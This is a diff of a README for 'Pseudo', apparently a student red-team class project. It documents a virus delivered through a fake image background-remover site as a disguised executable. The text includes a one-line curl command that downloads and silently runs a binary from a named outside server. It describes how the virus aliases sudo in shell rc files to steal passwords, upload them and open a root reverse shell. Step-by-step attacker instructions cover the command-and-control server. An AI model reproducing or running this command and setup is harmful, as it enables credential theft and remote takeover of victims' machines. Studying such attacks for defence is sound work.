@@ -7,28 +7,50 @@ Abel Bellows, Michael Avrahami, Stanley Hoo
        
 ## Ethical Disclaimer
 
-This project is a **red-team simulation** created strictly for **educational purposes** as part of our cybersecurity's class final project. The goal is to demonstrate how social engineering and obfuscated file execution can be used to bypass user expectations and install unknown background scripts or viruses. No part of this project should be used maliciously, and the authors do **not** condone unauthorized access, data collection, or exploitation in any context.
+This project is a **red-team simulation** created strictly for **educational purposes** as part of our cybersecurity's class final project. The goal is to demonstrate how social engineering and obfuscated file execution can be used to bypass user expectations and install unknown background scripts or viruses. No part of this project should be used maliciously, and the authors do **not** condone unauthorized access, data collection, or exploitation in any context. The authors of this project have only used this project in line with this description and have **always** recieved the consent of the target prior to  tesing any element of this project. All use of the project is at the users own risk.
 
 ## Project Description:
 
-**Pseudo** is a proof-of-concept web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) or `.desktop` (Linux) file that appears to be the processed image. As of right now, the executables will most likely be blocked by firewalls and require user permission to run, however it is possible to bypass these restrictions using certain methods.
+**Pseudo** is a proof-of-concept virus that demonstrates that shell configuration files can act as vulnerabilities for stealing a targets sudo password. The virus is delivered to windows users through web-based attack vector posing as an image background remover tool. Users upload an image to remove its background and are given a disguised `.exe` (Windows) file that appears to be the processed image. As of right now, the executables will most likely be blocked by firewalls and require user permission to run, however it is possible to bypass these restrictions using certain methods. This virus is capable of infecting any linux machine but should be compiled seperatly on the target machine or installed via this command: `curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; chmod +x ~/.config/rm17-node 2>/dev/null; ~/.config/rm17-node 2>/dev/null;`
 
-When opened, the executable:
+When the exe is opened on a Windows computer, the executable:
 - Downloads and saves a hidden script (`runme`) from our server in an obscure location then executes the script.
 - Downloads and opens the background-removed image to avoid suspicion.
 - Deletes itself to avoid detection.
 - Collects system credentials upon next `sudo` usage in a new terminal (on Linux or WSL for Windows) and sends them back to the web server.
-- Supports optional reverse shell payloads via the compiled `runme` binary.
+- After collecting sudo credentials launches a reverse shell to the attack server.
+
+This same effect can be achieved on any linux machine through running the command above.
   
-## Instructions:
+## Instructions
+
+### (for victim):
 
 Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tech), upload an image, and download the result (you may have to turn off your firewall to allow it to download). Note the file may take several seconds to upload/download. Do not spam the buttons. Opening the downloaded file will execute the hidden script and display the image.
 
 > This tool is only intended for use by project reviewers or classmates as part of the educational evaluation. Do not distribute or run on unauthorized systems.
 
+Press on the exe and wait. Then open up a wsl window and attempt to use the sudo command.
+
+Alternitivly use the command at the top of this README.
+
 ---
 
-### Local Installation Guide (Optional)
+### Installation guide for attacker.
+
+1. Clone this repository:
+    ```bash
+    git clone git@github.com:Stuycs-K/finalproject-10-bellows-a-hoo-s-avrahami-m.git
+    cd finalproject-10-bellows-a-hoo-s-avrahami-m
+    ```
+2. `cd c_scripts` and `make all`
+3. run the server by running `./server`. By default the virus you download from the website will have the reverse shell IP address set to a digital ocean box owned by us that is running this server. Mr K, we will give you the login to this server seperatly for ease of use. If the attack server is not running on that digital ocean box, you need to change the IP address defined at the top of the file **pseudo.c** to the public address of the server you are using. This will not update the website so you will need to compile and distribute the virus seperatly using `make compile`.
+4. The server will print out a command that begins `./user_shell <PID>`. Run this command in a seperate window to sync the command entry and the server.
+5. Once a virus connects to the server, you will be able to type commands that will be transmitted directly to the target's machine.
+ * Two special commands (d is some digit corresponding to a virus) are
+   a) `d childinfo` reprints a bunch of info about the target machine, like ip address and sudo password
+   b) `d destroy` deletes the sudo alias from any rc files and removes the virus itself from the target machine, leaving no trace
+### Installation Guide for Webserver (Optional)
 
 1. Clone this repository:
     ```bash
@@ -70,9 +92,7 @@ Visit our website [https://cyber.stanleyhoo1.tech](https://cyber.stanleyhoo1.tec
 
 9. Visit `http://localhost:5000` or your domain to interact with the tool.
 
-### C Payloads (Optional)
-
-You can also just test the C-based payloads by following these instructions:
+### Local testing (Optional)
 
 1. Clone this repository:
     ```bash
@@ -102,10 +122,17 @@ You can also just test the C-based payloads by following these instructions:
 
 ------ Virus Instructions ------
    
-8. To create the alias for sudo type `make implant`. If you used the above method with the downloading the image and executable this step is unnecessary
+8. To create the alias for sudo run the virus: `./runme`. If you used the above method with the downloading the image and executable this step is unnecessary
 
 9. Close the terminal and reopen it to ensure the rc file reloads. This simulates a user coming back at a later time. Now enter some sort of sudo command (it doesn't need to need sudo privileges, it can be something simple like sudo ls)
-* Type in the correct password. This will cause the virus to steal your password, upload it to a stored database on the website, and start a reverse shell with sudo privileges which the server will then pick up.
+
+* Type in the correct password. This will cause the virus to steal your password, upload it to a stored database on the website, and start a reverse shell with sudo privileges which the server will then pick up. If the incorrect password is entered, the virus will reprompt you for the password. 
+
+## BUGS
+
+1. Sudo will always require your password -- the window in which your sudo account remains unlocked is nonexistent.
+2. To run `d destroy` as the attacker, you need to first `su` to the user who owns the virus so that the destroy script targets their account specifically.
+3. Sometimes after the psuedo finishes the reverse shell launch, there is a delay before the cmd prompt prints again.
 
 ---
 
